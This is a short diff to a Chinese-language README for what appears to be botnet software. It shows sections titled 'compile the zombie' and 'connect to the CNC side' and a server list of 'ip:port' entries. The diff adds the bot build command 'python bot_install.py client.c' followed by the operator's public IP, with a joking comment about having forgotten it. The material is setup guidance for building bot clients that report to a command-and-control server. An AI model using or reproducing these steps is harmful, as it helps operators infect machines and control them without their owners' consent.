@@ -40,7 +40,9 @@ unsigned char *commServer[] = {"ip:port", "ip:port"};
 ```
 ## 编译僵尸
 ```python
-python bot_install.py
+#忘了这个哈哈
+
+python bot_install.py client.c 你的公网IP
 ```
 ## 连接cnc端
 ```
